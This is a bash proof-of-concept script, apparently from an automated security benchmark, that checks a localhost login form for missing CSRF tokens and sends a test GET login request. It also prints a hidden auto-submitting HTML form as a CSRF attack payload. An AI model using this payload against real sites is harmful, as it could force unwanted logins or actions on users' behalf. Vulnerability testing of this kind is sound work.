#!/bin/bash
# POC: Bash script to verify CSRF token absence in login form and demonstrate GET-based CSRF attack capability
# Target: ./repo
# Created: 2025-11-07T18:32:09.448Z
# Session: benchmark-XBEN-055-24-mhp6srme

# CSRF Token Verification POC
# This script verifies that the login form at http://localhost:3000/ lacks CSRF protection
# by checking for the presence of CSRF token fields in the HTML form

TARGET_URL="http://localhost:3000/"
FORM_ACTION_URL="http://localhost:3000/index.php"

echo "=========================================="
echo "CSRF Protection Verification POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Fetch the login form HTML
echo "[*] Fetching login form from target application..."
HTML_CONTENT=$(curl -s "$TARGET_URL")

if [ -z "$HTML_CONTENT" ]; then
    echo "[-] Failed to fetch HTML content from target"
    exit 1
fi

echo "[+] Successfully fetched HTML content"
echo ""

# Check for CSRF token patterns
echo "[*] Checking for CSRF token protection mechanisms..."
echo ""

# Common CSRF token patterns to look for
CSRF_PATTERNS=(
    "csrf_token"
    "_token"
    "__RequestVerificationToken"
    "token"
    "nonce"
)

TOKEN_FOUND=0

for pattern in "${CSRF_PATTERNS[@]}"; do
    if echo "$HTML_CONTENT" | grep -qi "$pattern"; then
        echo "[!] Found pattern: $pattern"
        TOKEN_FOUND=1
    fi
done

echo ""

# Check specifically for hidden input fields
echo "[*] Analyzing form structure..."
echo ""

# Extract form element
FORM_SECTION=$(echo "$HTML_CONTENT" | grep -A 10 '<form')

if [ -z "$FORM_SECTION" ]; then
    echo "[-] No form element found"
    exit 1
fi

echo "[+] Form element found:"
echo "$FORM_SECTION"
echo ""

# Check for hidden inputs (typically used for CSRF tokens)
HIDDEN_INPUTS=$(echo "$FORM_SECTION" | grep -i 'type="hidden"')

if [ -z "$HIDDEN_INPUTS" ]; then
    echo "[-] VULNERABILITY CONFIRMED: No hidden input fields found (expected for CSRF tokens)"
    TOKEN_FOUND=0
else
    echo "[+] Hidden input fields found:"
    echo "$HIDDEN_INPUTS"
fi

echo ""
echo "=========================================="

if [ $TOKEN_FOUND -eq 0 ]; then
    echo "RESULT: CSRF VULNERABILITY CONFIRMED"
    echo "=========================================="
    echo ""
    echo "The login form does NOT include CSRF token protection."
    echo "An attacker can craft malicious forms to trigger login requests."
    echo ""
    echo "Vulnerability Details:"
    echo "  - Form uses GET method (also exposes credentials in URL)"
    echo "  - No CSRF token field present"
    echo "  - No nonce or request verification mechanism"
    echo "  - Form can be reproduced in attacker-controlled HTML"
    echo ""
    
    # Demonstrate the attack
    echo "[*] Demonstrating CSRF attack via GET request..."
    echo ""
    echo "Attack command:"
    echo "  curl 'http://localhost:3000/index.php?username=attacker&password=malicious'"
    echo ""
    
    # Test the GET request
    CSRF_TEST=$(curl -s -o /dev/null -w "%{http_code}" "$FORM_ACTION_URL?username=testuser&password=testpass")
    
    echo "Response code: $CSRF_TEST"
    
    if [ "$CSRF_TEST" == "200" ]; then
        echo "[+] Server accepted GET request with credentials (vulnerable to CSRF)"
    fi
    
    echo ""
    echo "EXPLOITATION: An attacker can embed this into any webpage:"
    echo "  <form action='http://localhost:3000/index.php' method='GET' style='display:none;'>"
    echo "    <input type='hidden' name='username' value='attacker'>"
    echo "    <input type='hidden' name='password' value='malicious'>"
    echo "  </form>"
    echo "  <script>document.forms[0].submit();</script>"
    echo ""
    exit 0
else
    echo "RESULT: CSRF protection may be present"
    echo "=========================================="
    exit 1
fi